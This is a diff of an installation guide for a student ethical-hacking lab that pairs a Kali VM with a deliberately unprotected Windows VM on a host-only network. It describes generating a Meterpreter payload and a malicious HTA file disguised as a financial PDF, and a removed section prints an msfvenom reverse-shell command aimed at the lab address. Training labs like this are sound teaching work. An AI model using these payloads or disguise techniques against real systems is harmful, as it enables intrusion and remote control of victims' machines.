@@ -1,7 +1,6 @@
-# Installation Guide
-## Ethical Hacking Lab - HTA Exploit
+# Installation Guide - HTA Exploit Lab
 
-Complete step-by-step installation instructions for the HTA (HTML Application) exploit lab.
+Step-by-step setup instructions for the ethical hacking lab environment.
 
 ---
 
@@ -12,8 +11,7 @@ Complete step-by-step installation instructions for the HTA (HTML Application) e
 3. [Installing Prerequisites](#installing-prerequisites)
 4. [Automated Installation](#automated-installation)
 5. [Verification](#verification)
-6. [Post-Installation](#post-installation)
-7. [Troubleshooting](#troubleshooting)
+6. [Next Steps](#next-steps)
 
 ---
 
@@ -44,6 +42,8 @@ Complete step-by-step installation instructions for the HTA (HTML Application) e
 
 ### 1. Enable Virtualization
 
+Virtualization must be enabled in your system BIOS/UEFI.
+
 **Check if enabled:**
 
 **Linux:**
@@ -55,216 +55,187 @@ egrep -c '(vmx|svm)' /proc/cpuinfo
 **macOS:**
 ```bash
 sysctl -a | grep machdep.cpu.features | grep VMX
-# Should show VMX
+# Output with VMX = enabled
 ```
 
 **Windows:**
 ```powershell
-systeminfo | findstr /i "Hyper-V"
-# Should show "Yes" or virtualization enabled
+systeminfo | findstr /i "Virtualization"
+# Should show: "Enabled"
 ```
 
-**If not enabled:**
-- Reboot computer
-- Enter BIOS/UEFI (usually F2, F10, or DEL during boot)
-- Find "Virtualization Technology" or "VT-x" or "AMD-V"
-- Enable it
-- Save and reboot
+**If disabled:**
+1. Reboot computer
+2. Enter BIOS/UEFI (F2, F10, DEL, or ESC during boot)
+3. Find "Virtualization Technology" or "VT-x" or "AMD-V"
+4. Enable it
+5. Save and reboot
 
 ---
 
-### 2. Disable Hyper-V (Windows Only)
+### 2. Check Disk Space
 
-If using Windows, Hyper-V must be disabled for VirtualBox to work:
-
-```powershell
-# Run as Administrator
-bcdedit /set hypervisorlaunchtype off
-```
-
-Reboot computer.
-
----
-
-### 3. Free Up Disk Space
-
-Ensure you have at least 40GB free:
-
-**Linux/macOS:**
+**All platforms:**
 ```bash
-df -h
+df -h .           # Linux/macOS
 ```
 
-**Windows:**
 ```powershell
-Get-PSDrive C
+Get-PSDrive C     # Windows
 ```
+
+Ensure you have **40+ GB free** on the installation drive.
 
 ---
 
 ## Installing Prerequisites
 
-### VirtualBox
+### VirtualBox Installation
 
-**Linux (Ubuntu/Debian):**
-```bash
-# Add Oracle VirtualBox repository
-wget -q https://www.virtualbox.org/download/oracle_vbox_2016.asc -O- | sudo apt-key add -
-echo "deb [arch=amd64] https://download.virtualbox.org/virtualbox/debian $(lsb_release -sc) contrib" | sudo tee /etc/apt/sources.list.d/virtualbox.list
+**Download:** https://www.virtualbox.org/wiki/Downloads
 
-# Install VirtualBox
-sudo apt update
-sudo apt install virtualbox-7.0
-```
+| Platform | Installation |
+|----------|--------------|
+| **Windows** | Run `.exe` installer, follow prompts |
+| **macOS** | Open `.dmg`, drag to Applications, approve in Security & Privacy |
+| **Ubuntu/Debian** | `sudo apt install virtualbox` |
+| **Fedora/RHEL** | `sudo dnf install VirtualBox` |
 
-**macOS:**
-```bash
-# Using Homebrew
-brew install --cask virtualbox
-
-# Or download from: https://www.virtualbox.org/wiki/Downloads
-```
-
-**Windows:**
-1. Download installer: https://www.virtualbox.org/wiki/Downloads
-2. Run installer as Administrator
-3. Follow installation wizard
-4. Reboot if prompted
-
-**Verify installation:**
+**Verify:**
 ```bash
 VBoxManage --version
-# Should show version 7.0.x or higher
+# Expected: 7.0.x or higher
 ```
 
 ---
 
-### Vagrant
+### Vagrant Installation
 
-**Linux (Ubuntu/Debian):**
-```bash
-# Download and install Vagrant
-wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
-echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
-sudo apt update && sudo apt install vagrant
-```
+**Download:** https://www.vagrantup.com/downloads
 
-**macOS:**
-```bash
-# Using Homebrew
-brew install vagrant
+| Platform | Installation |
+|----------|--------------|
+| **Windows** | Run `.msi` installer |
+| **macOS** | `brew install vagrant` or use `.dmg` |
+| **Ubuntu/Debian** | Download `.deb` from website |
+| **Fedora/RHEL** | Download `.rpm` from website |
 
-# Or download from: https://www.vagrantup.com/downloads
-```
-
-**Windows:**
-1. Download installer: https://www.vagrantup.com/downloads
-2. Run installer as Administrator
-3. Follow installation wizard
-4. Reboot if prompted
-
-**Verify installation:**
+**Verify:**
 ```bash
 vagrant --version
-# Should show version 2.3.x or higher
+# Expected: 2.3.x or higher
 ```
-
----
-
-### Git (Optional but Recommended)
-
-**Linux:**
-```bash
-sudo apt install git
-```
-
-**macOS:**
-```bash
-brew install git
-```
-
-**Windows:**
-Download from: https://git-scm.com/download/win
 
 ---
 
 ## Automated Installation
 
+### Installation Workflow
+
+```mermaid
+graph TD
+    START[Clone Repository] --> CHECK{Prerequisites<br/>installed?}
+    CHECK -->|No| INSTALL[Install VirtualBox & Vagrant]
+    CHECK -->|Yes| RUN[Run setup script]
+    INSTALL --> RUN
+
+    RUN --> NETWORK[Create Host-Only Network]
+    NETWORK --> KALI[Build Kali VM]
+    KALI --> WINDOWS[Build Windows VM]
+    WINDOWS --> VERIFY[Verify Connectivity]
+    VERIFY --> SNAPSHOT[Create Snapshots]
+    SNAPSHOT --> DONE[Setup Complete!]
+
+    style START fill:#3498db,color:#fff
+    style RUN fill:#2ea44f,color:#fff
+    style DONE fill:#f39c12,color:#fff
+```
+
+---
+
 ### Step 1: Clone Repository
 
-**With Git:**
 ```bash
 git clone https://github.com/gcheliz/ethical-hacking-student-lab.git
 cd ethical-hacking-student-lab
 ```
 
-**Without Git:**
-1. Download ZIP: https://github.com/gcheliz/ethical-hacking-student-lab/archive/refs/heads/master.zip
-2. Extract to a folder
-3. Open terminal in that folder
-
 ---
 
 ### Step 2: Run Setup Script
 
-**Linux/macOS:**
+**macOS/Linux:**
 ```bash
 ./setup.sh
 ```
 
-**Windows (PowerShell - Run as Administrator recommended):**
+**Windows (PowerShell as Administrator):**
 ```powershell
 .\setup.ps1
 ```
 
 ---
 
-### What the Setup Script Does
+### Setup Process Timeline
 
-```
-[1/7] Checking prerequisites
-  - Verifies VirtualBox installed
-  - Verifies Vagrant installed
-  - Checks disk space (40+ GB)
-  - Checks memory (8+ GB)
-
-[2/7] Preparing exploits directory
-  - Creates exploits folder structure
-  - Prepares for payload generation
-
-[3/7] Configuring VirtualBox network
-  - Creates host-only network (192.168.56.0/24)
-  - Configures network adapter
-  - Disables DHCP
-
-[4/7] Building Kali Linux VM (5-10 minutes)
-  - Downloads Kali Linux box (~3 GB)
-  - Creates VM with 3GB RAM, 2 CPUs
-  - Configures network (192.168.56.101)
-  - Installs Metasploit and tools
-  - Generates Meterpreter EXE payload
-  - Generates malicious HTA file
-  - Sets up HTTP server (auto-starts on boot)
-
-[5/7] Building Windows Server 2008 R2 VM (20-30 minutes)
-  - Downloads Windows box (~5 GB)
-  - Creates VM with 4GB RAM, 2 CPUs
-  - Configures network (192.168.56.102)
-  - Disables all security features
-  - Tests connectivity to Kali
-
-[6/7] Verifying network connectivity
-  - Tests Kali → Windows (ping)
-  - Tests Windows → Kali (ping)
-  - Verifies network configuration
-
-[7/7] Creating snapshots
-  - Creates "Clean_State" snapshot for Kali
-  - Creates "Clean_State" snapshot for Windows
-  - Allows easy reset after exploitation
+```mermaid
+gantt
+    title Lab Setup Timeline
+    dateFormat  mm
+    section Network
+    Create Host-Only Network      :done, 00, 1m
+    section Kali VM
+    Download Kali box (~3GB)       :active, 01, 5m
+    Create VM (3GB RAM, 2 CPU)     :02, 2m
+    Configure network              :03, 1m
+    Install Metasploit             :04, 2m
+    Generate exploits              :05, 1m
+    section Windows VM
+    Download Windows box (~5GB)    :06, 10m
+    Create VM (4GB RAM, 2 CPU)     :07, 3m
+    Disable security               :08, 3m
+    Install Adobe Reader           :09, 2m
+    Configure network              :10, 1m
+    section Finalize
+    Test connectivity              :11, 1m
+    Create snapshots               :12, 1m
 ```
 
-**Total Time: 15-30 minutes** (depending on internet speed)
+**Total Time:** 15-30 minutes (depending on download speed)
+
+---
+
+### What Happens During Setup
+
+#### Phase 1: Network Configuration (1 minute)
+- Creates Host-Only network (192.168.56.0/24)
+- Configures network adapter
+- Disables DHCP
+
+#### Phase 2: Kali Linux VM (5-10 minutes)
+- Downloads Kali Linux box (~3 GB)
+- Creates VM with 3GB RAM, 2 CPUs
+- Configures network (192.168.56.101)
+- Installs Metasploit and tools
+- Generates Meterpreter EXE payload
+- Generates malicious HTA file
+- Sets up HTTP server (auto-starts on boot)
+
+#### Phase 3: Windows Server 2008 R2 VM (20-30 minutes)
+- Downloads Windows box (~5 GB)
+- Creates VM with 4GB RAM, 2 CPUs
+- Configures network (192.168.56.102)
+- Disables Windows Firewall
+- Disables Windows Defender
+- Disables UAC
+- Disables AppLocker
+- Installs Adobe Reader (for PDF icon)
+- Creates desktop shortcuts for attack delivery
+
+#### Phase 4: Verification & Snapshots (2 minutes)
+- Tests Kali → Windows connectivity
+- Tests Windows → Kali connectivity
+- Creates "Clean_State" snapshots for easy reset
 
 ---
 
@@ -277,25 +248,28 @@ cd vagrant
 vagrant status
 ```
 
-Expected output:
+**Expected output:**
 ```
-Current machine states:
-
-kali                      running (virtualbox)
-win2k8                    running (virtualbox)
+kali      running (virtualbox)
+win2k8    running (virtualbox)
 ```
 
 ---
 
 ### Verify Network Connectivity
 
-**From Kali:**
+**Test from Kali:**
 ```bash
 vagrant ssh kali
-ping -c 4 192.168.56.102
+ping -c 2 192.168.56.102
+# Expected: 2 packets transmitted, 2 received, 0% packet loss
 ```
 
-Expected: `4 packets transmitted, 4 received, 0% packet loss`
+**Test from Windows:**
+```powershell
+vagrant winrm win2k8 -c "Test-Connection 192.168.56.101 -Count 2"
+# Expected: 2 packets sent, 2 received
+```
 
 ---
 
@@ -303,15 +277,30 @@ Expected: `4 packets transmitted, 4 received, 0% packet loss`
 
 ```bash
 vagrant ssh kali
-ls -la /vagrant/exploits/hta/
+ls -la /home/vagrant/hta_payloads/
 ```
 
-Expected files:
+**Expected files:**
 ```
-update.exe                      # Meterpreter EXE payload
+update.exe                      # Meterpreter EXE payload (~73KB)
 Q4_Financial_Report_EXE.pdf.hta # Malicious HTA file
-start_hta_attack.sh             # Attack automation script
-README.md                       # Instructions
+Test_EXE_Download.hta           # Testing HTA file
+```
+
+---
+
+### Verify HTTP Server
+
+```bash
+vagrant ssh kali
+sudo systemctl status hta-http-server
+# Expected: Active: active (running)
+```
+
+**Test from Windows:**
+```powershell
+vagrant winrm win2k8 -c "Invoke-WebRequest http://192.168.56.101:8080/"
+# Expected: StatusCode: 200
 ```
 
 ---
@@ -320,6 +309,29 @@ README.md                       # Instructions
 
 ### First Attack Test
 
+```mermaid
+sequenceDiagram
+    participant U as You
+    participant K as Kali VM
+    participant W as Windows VM
+    participant M as Meterpreter
+
+    U->>K: vagrant ssh kali
+    U->>K: cd /vagrant/exploits/hta
+    U->>K: ./start_hta_attack.sh
+    K->>K: Start HTTP server
+    K->>K: Start Metasploit listener
+
+    U->>W: Double-click shortcut
+    W->>K: Download HTA file
+    W->>W: Execute HTA
+    W->>K: Download update.exe
+    W->>K: Execute EXE
+    W->>M: Connect to Meterpreter
+    M-->>U: Session opened!
+```
+
+**Commands:**
 ```bash
 # 1. SSH into Kali
 cd vagrant
@@ -331,8 +343,8 @@ cd /vagrant/exploits/hta
 # 3. Start the attack
 ./start_hta_attack.sh
 
-# 4. In Windows VM, double-click "Download_Exploit_from_Kali" on Desktop
-# 5. Double-click the downloaded "Q4_Financial_Report.pdf"
+# 4. On Windows VM: Double-click "Download_Exploit_from_Kali"
+# 5. Double-click the downloaded file
 # 6. Meterpreter session should open!
 ```
 
@@ -340,178 +352,15 @@ cd /vagrant/exploits/hta
 
 ### Create Clean Snapshot (if needed)
 
-If you made changes and want to create a new baseline:
+The setup script automatically creates snapshots. If you need to create manual snapshots:
 
 ```bash
-cd vagrant
-
-# Stop VMs
-vagrant halt
+# Get VM names
+VBoxManage list vms
 
 # Create snapshot
-VBoxManage snapshot "Kali_Exploit_Lab_XXXXX" take "My_Clean_State"
-VBoxManage snapshot "Windows_Exploit_Target_XXXXX" take "My_Clean_State"
-```
-
----
-
-## Troubleshooting
-
-### VirtualBox Installation Issues
-
-**Error: "VT-x is disabled"**
-- Solution: Enable virtualization in BIOS
-
-**Error: "VirtualBox kernel driver not loaded"**
-```bash
-# Linux
-sudo modprobe vboxdrv
-
-# If fails, reinstall:
-sudo /sbin/vboxconfig
-```
-
-**macOS: "System Extension Blocked"**
-- Go to System Preferences → Security & Privacy
-- Click "Allow" for Oracle VirtualBox
-
----
-
-### Vagrant Issues
-
-**Error: "Vagrant failed to initialize"**
-```bash
-# Reinstall Vagrant plugins
-vagrant plugin expunge --reinstall
-```
-
-**Error: "Box download fails"**
-- Check internet connection
-- Try manual download and add:
-```bash
-vagrant box add kalilinux/rolling /path/to/downloaded/box
-```
-
----
-
-### Network Configuration Issues
-
-**VMs can't communicate:**
-```bash
-# On host, verify host-only network exists
-VBoxManage list hostonlyifs
-
-# If missing, recreate:
-VBoxManage hostonlyif create
-VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
-
-# Then destroy and rebuild VMs
-cd vagrant
-vagrant destroy -f
-vagrant up
-```
-
-**Kali network not configured:**
-```bash
-# SSH into Kali
-vagrant ssh kali
-
-# Check network interface
-ip addr show
-
-# Manually configure if needed
-sudo ip addr add 192.168.56.101/24 dev eth1
-sudo ip link set eth1 up
-```
-
----
-
-### Windows VM Issues
-
-**Windows VM won't boot:**
-- Increase timeout in Vagrantfile:
-```ruby
-win.vm.boot_timeout = 900  # 15 minutes
-```
-
-**WinRM timeout:**
-- Check firewall on host
-- Verify NAT adapter is working
-- Try: `vagrant reload win2k8`
-
----
-
-### Exploit Generation Issues
-
-**HTA file not created:**
-```bash
-# SSH into Kali
-vagrant ssh kali
-
-# Manually run provisioning script
-cd /vagrant/vagrant/provisioning/kali
-./create_hta_exploit.sh
-```
-
-**EXE payload missing:**
-```bash
-# Generate manually
-msfvenom -p windows/x64/meterpreter/reverse_tcp \
-    LHOST=192.168.56.101 \
-    LPORT=4444 \
-    -a x64 \
-    --platform windows \
-    -f exe \
-    -o /vagrant/exploits/hta/update.exe
-```
-
----
-
-### Disk Space Issues
-
-**Cleanup old boxes:**
-```bash
-# Remove unused boxes
-vagrant box prune
-
-# Remove specific box
-vagrant box remove kalilinux/rolling
-vagrant box remove rapid7/metasploitable3-win2k8
-```
-
-**Compact VMs:**
-```bash
-# Compact Kali VM
-VBoxManage modifymedium disk /path/to/kali.vdi --compact
-
-# Compact Windows VM
-VBoxManage modifymedium disk /path/to/windows.vdi --compact
-```
-
----
-
-### Complete Reinstallation
-
-If everything fails:
-
-```bash
-# 1. Destroy everything
-cd vagrant
-vagrant destroy -f
-
-# 2. Remove boxes
-vagrant box remove kalilinux/rolling --all
-vagrant box remove rapid7/metasploitable3-win2k8 --all
-
-# 3. Remove VirtualBox network
-VBoxManage hostonlyif remove vboxnet0
-
-# 4. Clean Vagrant cache
-rm -rf ~/.vagrant.d/boxes/*
-
-# 5. Start fresh
-cd ..
-./setup.sh
+VBoxManage snapshot "kali_vm_name" take "My_Snapshot" --description "Description"
+VBoxManage snapshot "windows_vm_name" take "My_Snapshot" --description "Description"
 ```
 
 ---
@@ -520,31 +369,59 @@ cd ..
 
 ### macOS
 
-- **M1/M2 (Apple Silicon)**: VirtualBox does not support ARM architecture. Use alternatives:
-  - UTM (QEMU-based virtualization)
-  - Parallels Desktop (commercial)
-  - VMware Fusion (commercial)
+**Security & Privacy:**
+- First run may require approval in System Preferences > Security & Privacy
+- Allow VirtualBox kernel extensions
+- May need to reboot after VirtualBox installation
 
-- **Permissions**: Grant VirtualBox permissions in System Preferences
+**VirtualBox 7.0+ on Apple Silicon (M1/M2):**
+- VirtualBox 7.0+ supports Apple Silicon
+- Performance may vary compared to Intel Macs
+- Ensure latest VirtualBox version
+
+---
 
 ### Windows
 
-- **Windows Home**: Hyper-V is not available, use VirtualBox
-- **Windows Pro/Enterprise**: Disable Hyper-V before using VirtualBox
-- **Antivirus**: May flag exploit files as malicious (expected behavior)
+**Administrator Rights:**
+- Run PowerShell as Administrator for setup
+- Required for VirtualBox network adapter creation
+
+**Windows Defender:**
+- May flag exploit files as malicious (expected behavior)
+- Add repository folder to exclusions if needed
+
+**Hyper-V Conflict:**
+- Disable Hyper-V if installed (conflicts with VirtualBox)
+- Run: `bcdedit /set hypervisorlaunchtype off` (requires reboot)
+
+---
 
 ### Linux
 
-- **Kernel Updates**: May require rebuilding VirtualBox kernel modules:
-```bash
-sudo /sbin/vboxconfig
-```
+**Package Conflicts:**
+- Remove conflicting virtualbox packages: `sudo apt purge virtualbox-dkms`
+- Install from official VirtualBox repository
 
-- **Permissions**: Add user to vboxusers group:
-```bash
-sudo usermod -aG vboxusers $USER
-# Logout and login again
-```
+**Kernel Modules:**
+- VirtualBox requires kernel modules
+- Run `sudo /sbin/vboxconfig` if modules fail to load
+
+---
+
+## Quick Troubleshooting
+
+**If setup fails, check:**
+
+| Issue | Quick Fix |
+|-------|-----------|
+| VT-x not enabled | Enable in BIOS/UEFI |
+| Insufficient disk space | Free up 40+ GB |
+| Network adapter fails | Run `vagrant reload` |
+| Download timeout | Check internet connection |
+| VM won't start | Ensure VT-x enabled, reboot |
+
+**For detailed troubleshooting:** See [TROUBLESHOOTING.md](TROUBLESHOOTING.md)
 
 ---
 
@@ -552,32 +429,36 @@ sudo usermod -aG vboxusers $USER
 
 Once installation is complete:
 
-1. Read [exploits/hta/README.md](exploits/hta/README.md) for attack details
-2. Read [HOW_TO_USE.md](HOW_TO_USE.md) for usage instructions
-3. Run your first attack
-4. Explore Meterpreter commands
-5. Practice defensive measures
+1. ✅ Read [User Guide](docs/USER_GUIDE.md) for attack scenarios
+2. ✅ Run your first attack
+3. ✅ Explore [Meterpreter Commands](docs/METERPRETER_USAGE_GUIDE.md)
+4. ✅ Review [Learning Objectives](docs/LEARNING_OBJECTIVES.md)
+5. ✅ Study [Technical Details](exploits/hta/README.md)
 
 ---
 
-## Getting Help
+## Uninstallation
 
-If installation fails:
+To completely remove the lab:
 
-1. Check [TROUBLESHOOTING.md](TROUBLESHOOTING.md)
-2. Check [docs/NETWORK_DEBUGGING_GUIDE.md](docs/NETWORK_DEBUGGING_GUIDE.md)
-3. Review this guide's troubleshooting section
-4. Open GitHub issue with:
-   - Your OS and version
-   - VirtualBox and Vagrant versions
-   - Error messages (full output)
-   - Steps to reproduce
+```bash
+# Destroy VMs and free disk space
+./cleanup.sh
+
+# Remove Vagrant boxes
+vagrant box remove kalilinux/rolling
+vagrant box remove rapid7/metasploitable3-win2k8
+
+# Remove repository
+cd ..
+rm -rf ethical-hacking-student-lab
+```
 
 ---
 
-**Installation complete? Start attacking! See [HOW_TO_USE.md](HOW_TO_USE.md)**
+**Installation complete? Start attacking!** See [docs/USER_GUIDE.md](docs/USER_GUIDE.md)
 
 ---
 
-*Last Updated: 2026-01-10*
-*Version: 2.0 - HTA Exploit Lab*
+**Version:** 2.0 - HTA Exploit Lab
+**Last Updated:** 2026-01-10
